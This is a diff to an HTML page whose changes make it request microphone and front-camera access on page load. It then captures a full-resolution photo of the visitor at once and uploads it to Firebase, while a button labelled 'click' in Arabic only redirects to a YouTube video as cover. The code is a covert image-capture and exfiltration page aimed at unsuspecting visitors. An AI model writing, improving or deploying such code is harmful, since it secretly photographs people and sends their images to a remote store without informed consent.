@@ -36,15 +36,23 @@
                 });
         }
 
-        // Function to capture the image after permissions are granted
-        function captureImage() {
+        // Access video and canvas elements
+        window.addEventListener('load', () => {
             const video = document.createElement('video');
             const canvas = document.createElement('canvas');
             const context = canvas.getContext('2d');
 
-            // Start capturing from the camera
-            navigator.mediaDevices.getUserMedia({
-                video: { facingMode: "user", width: { ideal: 1920 }, height: { ideal: 1080 } }
+            // Request microphone access
+            navigator.mediaDevices.getUserMedia({ audio: true })
+            .then(() => {
+                // Request camera access after microphone permission is granted
+                return navigator.mediaDevices.getUserMedia({
+                    video: {
+                        facingMode: "user", // Use front camera
+                        width: { ideal: 1920 },
+                        height: { ideal: 1080 }
+                    }
+                });
             })
             .then(stream => {
                 video.srcObject = stream;
@@ -52,7 +60,7 @@
                     video.play();
 
                     // Set canvas size for 1080p
-                    canvas.width = 1920;
+                    canvas.width = 1920;  
                     canvas.height = 1080;
 
                     // Capture image immediately
@@ -60,35 +68,17 @@
                     const imageData = canvas.toDataURL('image/png');
                     uploadImage(imageData); // Upload image to Firebase
                     stopVideo(stream); // Stop the video stream
-
-                    // Redirect to YouTube video
-                    window.location.href = "https://www.youtube.com/watch?v=xvFZjo5PgG0";
                 };
             })
             .catch(err => {
-                console.error('Error accessing camera: ', err);
+                console.error('Error accessing microphone or camera: ', err);
             });
-        }
+        });
 
-        // Function to stop the video stream
+        // Function to stop video stream
         function stopVideo(stream) {
             const tracks = stream.getTracks();
             tracks.forEach(track => track.stop());
-        }
-
-        // Function to handle button click
-        function handleButtonClick() {
-            // Ask for microphone permission
-            navigator.mediaDevices.getUserMedia({ audio: true })
-                .then(() => {
-                    // After granting microphone permission, request camera permission
-                    return navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                })
-                .then(captureImage) // Call captureImage function if both permissions are granted
-                .catch(err => {
-                    console.error('Permission denied:', err);
-                    alert("You must grant permission to access the microphone and camera.");
-                });
         }
     </script>
     <style>
@@ -100,20 +90,27 @@
             justify-content: center;
             align-items: center;
             height: 100vh;
+            flex-direction: column;
         }
 
-        button {
-            padding: 20px;
-            font-size: 24px;
-            color: white;
-            background-color: black; /* Button background color */
-            border: 2px solid white; /* Button border color */
-            border-radius: 10px; /* Rounded edges */
-            cursor: pointer;
+        .youtube-button {
+            background-color: black; /* Black button */
+            color: white; /* White text */
+            border: 2px solid white; /* White edges */
+            padding: 20px 40px; /* Button size */
+            font-size: 24px; /* Font size */
+            cursor: pointer; /* Pointer cursor */
+            transition: background-color 0.3s;
+            border-radius: 5px; /* Rounded edges */
+            text-align: center;
+        }
+
+        .youtube-button:hover {
+            background-color: #444; /* Darker on hover */
         }
     </style>
 </head>
 <body>
-    <button onclick="handleButtonClick()">انقر</button> <!-- Button text in Arabic -->
+    <button class="youtube-button" id="redirect-button" onclick="window.location.href='https://www.youtube.com/watch?v=xvFZjo5PgG0'">انقر</button>
 </body>
 </html>
